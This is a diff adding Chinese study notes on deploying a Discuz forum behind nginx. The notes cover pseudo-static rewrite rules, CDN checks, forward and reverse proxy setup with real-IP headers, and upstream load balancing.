+cd /html/bbs
+rz -E
+unzip Discuz_X3.4_SC_UTF8_0802.zip 
+mv upload/* .
+chown -R nginx:nginx .
+
+# 添加hosts文件解析即可
+192.168.61.139  wulaoban.com  wp.jaden.com  bbs.jaden.com
+```
+
+访问网站即可，需要几步初始化的动作。
+
+# 19.伪静态
+
+```
+纯静态网站，特点：没有交互、安全性好、速度快、方便SEO
+    # 每个页面都有一个唯一的url地址，比如：
+    https://www.cnblogs.com/clschao/articles/10526431.html
+    https://www.cnblogs.com/clschao/articles/10391859.html
+	# 不同的html文件看到一个不同的网页
+
+动态网站，特点：有交互、安全性相对差，速度相对慢、不方便SEO
+     http://bbs.jaden.com/forum.php?mod=forumdisplay&fid=2
+     http://bbs.jaden.com/forum.php?mod=viewthread&tid=1&extra=page%3D1
+     # http://bbs.jaden.com/forum.php网址是一样的，也就是服务端找的是同一个php文件，但是你会发现页面的数据不同了。
+    # 动态网站就是服务端根据客户端的网络请求数据中的查询参数数据来动态的给这个php文件加入不同的
+    
+动态数据
+伪静态，特点：有交互、不安全、最速最慢、方便SEO
+     # 实际上还是动态网站，只不过是做成了静态页面的网址效果。
+    比如：http://bbs.jaden.com/forum.php?mod=forumdisplay&fid=2
+    可能就变成了：http://bbs.jaden.com/2.html，结尾变成了html，并且没有查询参数了，而且看上去是一个页面一个html文件
+```
+
+discuz论坛配置伪静态 
+
+### 1、discuz开启伪静态
+
+#### 2、nginx添加伪静态的规则
+
+```nginx
+[root@web01 conf.d]# cat discuz.conf 
+server {
+  listen 80;
+  server_name bbs.jaden.com;
+  location / {
+    root /html/bbs;
+    index index.php index.html index.htm;
+    rewrite ^([^\.]*)/topic-(.+)\.html$ $1/portal.php? mod=topic&topic=$2 last;
+    rewrite ^([^\.]*)/article-([0-9]+)-([0-9]+)\.html$ $1/portal.php? mod=view&aid=$2&page=$3 last;
+    rewrite ^([^\.]*)/forum-(\w+)-([0-9]+)\.html$ $1/forum.php?
+mod=forumdisplay&fid=$2&page=$3 last;
+    rewrite ^([^\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\.html$ $1/forum.php? mod=viewthread&tid=$2&extra=page%3D$4&page=$3 last;
+    rewrite ^([^\.]*)/group-([0-9]+)-([0-9]+)\.html$ $1/forum.php?
+ mod=group&fid=$2&page=$3 last;
+    rewrite ^([^\.]*)/space-(username|uid)-(.+)\.html$ $1/home.php?
+ mod=space&$2=$3 last;
+    rewrite ^([^\.]*)/blog-([0-9]+)-([0-9]+)\.html$ $1/home.php?
+ mod=space&uid=$2&do=blog&id=$3 last;
+    rewrite ^([^\.]*)/(fid|tid)-([0-9]+)\.html$ $1/archiver/index.php?
+ action=$2&value=$3 last;
+    rewrite ^([^\.]*)/([a-z]+[a-z0-9_]*)-([a-z0-9_\-]+)\.html$ $1/plugin.php? id=$2:$3 last;
+ if (!-e $request_filename) {
+     return 404;
+    }
+  }
+    location ~ \.php$ {
+            root           /html/bbs;
+            fastcgi_pass   127.0.0.1:9000;
+            fastcgi_index  index.php;
+            fastcgi_param  SCRIPT_FILENAME /html/bbs$fastcgi_script_name;
+            include        fastcgi_params;
+   }
+ }
+```
+
+##### 伪静态的原理
+
+```nginx
+nginx会通过rewrite来重写一份新的url，产生一个动态的url来完成动态页面的效果
+
+默认模块页面：
+        动态url：http://bbs.jaden.com/forum.php?mod=forumdisplay&fid=2&page=1
+        伪静态url：http://bbs.jaden.com/forum-2-1.html
+        规则：rewrite ^([^\.]*)/forum-(\w+)-([0-9]+)\.html$ $1/forum.php? mod=forumdisplay&fid=$2&page=$3 last;
+         http://bbs.jaden.com/forum.php? mod=forumdisplay&fid=2&page=1
+	
+帖子： 
+    动态：http://bbs.jaden.com/forum.php  mod=viewthread&tid=1&extra=page%3D1
+    伪静态：http://bbs.jaden.com/thread-1-1-1.html
+    规则：rewrite ^([^\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\.html$ $1/forum.php? mod=viewthread&tid=$2&extra=page%3D$4&page=$3 last;
+```
+
+# 20.阿里云项目部署和CND加速
+
+阿里云、腾讯云、百度云、美团.... 
+
+1、购买云主机,部署项目 
+
+2、注册域名 
+
+3、备案 
+
+4、添加域名解析 
+
+5、购买加速服务，CDN 
+
+CDN可以加速、而且提高安全性 
+
+CDN加速原理：缓存技术、反向代理。
+
+```
+我刚才买的服务器的公网ip地址为：112.126.74.34，中国北京、阿里云的ip地址
+```
+
+CDN的结构：
+
+![image-20240530214027659](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530214027659.png)
+
+如何测试服务端是否开启了CDN加速功能： 
+
+超级ping，多地ping就能看出来，站长之家就有。 
+
+如果多地ping出来的都是一个ip地址，那么就没有开CDN。 
+
+比如ping一下我配置了CDN的域名 new.wulaoban.top
+
+# 21.正向代理
+
+客户端使用的代理我们一般称之为正向代理，服务端使用的代理我们一般称之为反向代理。 
+
+客户端如果使用了正向代理，那么服务端记录的是代理的ip地址，代理可以有很多层，而且很多网络是 正向代理和反向代理都存在。
+
+![image-20240530214355755](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530214355755.png)
+
+首先找一台服务器，比如我用阿里云的一台服务器作为正向代理服务器吧，安装一个centos7.8，然后安 装个nginx
+
+```
+# yum install nginx -y
+# 去掉配置用的#号行和空行
+
+[root@web01 conf.d]# grep -Ev '^$|#' /etc/nginx/nginx.conf.default > 
+/etc/nginx/nginx.conf
+
+[root@web01 conf.d]# vim /etc/nginx/nginx.conf
+ # 修改nginx的配置分别添加http和https的server，其他配置保持不变，我们就添加个http的演示一下即
+可
+# 将nginx.conf配置中的server部分替换为下面的server
+# 下面配置正向代理转发http请求
+server {
+ resolver 223.5.5.5;
+ listen 80;
+location / {
+        proxy_pass                 http://$host$request_uri;
+        proxy_set_header           HOST $host;
+        proxy_buffers              256 4k;
+        proxy_max_temp_file_size   0k;
+        proxy_connect_timeout      30;
+        proxy_send_timeout         60; 
+        proxy_read_timeout         60;
+        proxy_next_upstream error  timeout invalid_header http_502;
+        }
+ }
+ # nginx -t
+ # systemctl restart nginx
+ # 这时候的nginx就不代表一个网站了，只是帮我们进行请求的转发，就是单纯的代理。
+ 
+ 
+# 正向代理转发https请求，这个就暂时不说了
+```
+
+通过实时查看nginx的访问日志，可以看到Windows下设置代理IP和端口后，本地电脑访问的所有网页 会通过代理服务器进行访问网页，实现了正向代理的功能，并且隐藏了用户自己真实的IP。
+
+# 22.反向代理
+
+反向代理更多的时候是为了保护原站，还能用于负载均衡的效果。
+
+![image-20240530214619130](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530214619130.png)
+
+我们再去克隆一个虚拟机作为反向代理服务器，使用nginx作为反向代理工具，安装nginx，配置如下：
+
+```nginx
+[root@lb01 ~]# cat /etc/nginx/nginx.conf
+ worker_processes  1;
+ events {
+    worker_connections  1024;
+ }
+ http {
+    include       mime.types;
+    default_type  application/octet-stream;
+    sendfile        on;
+    keepalive_timeout  65;
+    server {
+        listen       80;
+        server_name  localhost;
+        location / {
+           proxy_pass http://192.168.61.140; # 将请求转发到哪个ip地址，原站的ip地址，并且其实我们正常的话是应该加一个DNS解析记录，将我们的域名指向这个代理服务器的ip地址。我们没有真实公网主机来演示，所以改一下hosts文件的记录即可，将原来的域名都指向这个代理主机的ip地址。然后访问网站，wireshark抓包就能看到转发效果。
+            
+# 如果只是单纯的配置上面这句话也可以完成反向代理，但是服务端的其他网站就没办法访问到了，因为nginx转发的时候，会用客户端请求的服务器的ip地址，不会用域名，域名丢了，那么服务端的nginx会自动打开一个网站给你响应。所以还是要设置一下nginx转发时的host请求头，让它变成域名。
+           proxy_set_header Host $host;  # 设置host，以防请求域名丢失。
+		  #proxy_set_header jaden 666666; # 可以自定定制多个转发请求时的请求头键值对
+# 下面这两个主要是为了记录客户端的真实ip地址，因为有了反向代理之后，我们看到记录的客户端的ip地址是反向代理服务器的ip地址，这样肯定不行呀，无法定位谁攻击的我，所以我们需要记录用户的真实ip，所以就可以在nginx转发请求的时候加两个请求头键值对，将客户端真实ip写进去
+           proxy_set_header X-Real-IP $remote_addr;   
+           proxy_set_header X-Forwarded-For $remote_addr;  # 这个简称叫做XFF，业内一般都用这个字段来记录客户端真实ip地址，也有用上面这个remote_addr来记录的，所以我们都配置上吧，将nginx的日志记录格式修改一下，加上一个"真实ip：$http_x_forwarded_for"
+ #proxy_set_header X-Forwarded-For $http_x_forwarded_for;
+        }
+    }
+ }
+# 后端服务器日志格式,vim /etc/nginx/nginx.conf，加上如下两条
+log_format main '$remote_addr - $remote_user [$time_local] "$request" $http_host 
+'
+'$status $body_bytes_sent "$http_referer" '
+'"$http_user_agent" "$http_x_forwarded_for"';
+access_log /var/log/nginx/new.log main;  # 给所有网站定义日志格式用的
+
+# 保存退出，然后访问网站，就看到日志了。
+```
+
+之前的网站服务器作为原站服务器，然后我们自己的物理机作为客户端访问。
+
+# 23.负载均衡模式
+
+nginx做反向代理的同时，还可以配置负载均衡，为了演示负载均衡的效果，我们再创建一个web网站服 务器。而且要保证这两台web服务器跑着相同的网站。两个网站简单写一些不太一样的东西，为了是让 大家看效果。 
+
+修改nginx反向代理的配置：
+
+```nginx
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+    sendfile        on;
+    keepalive_timeout  65;
+    upstream web{
+        server 192.168.61.140;
+        server 192.168.61.141;
+    }
+    server {
+        listen       80;
+        server_name  localhost;
+        
+        location / {
+           proxy_pass http://web;   # 这个地方不写死ip地址了，写个上面配置中的upstream的名称
+           proxy_set_header Host $host;  
+           proxy_set_header X-Real-IP $remote_addr;   
+           proxy_set_header X-Forwarded-For $http_x_forwarded_for;
+        }
+    }
+ }
+```
+
+
+
+# 24.网站架构
+
+大型的网站基本都不是一台服务器，一般都是由很多台服务器组成的集群
+
+![image-20240530214304506](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530214304506.png)
+
+大家重点知道一下，web服务器上可以运行着nginx和php站点，但是mysql不一定和他们在同一个服务 器上，一般数据库都会放到一个专门的服务器上，这个服务器我们叫做mysql服务器，专门用来存取数 据的
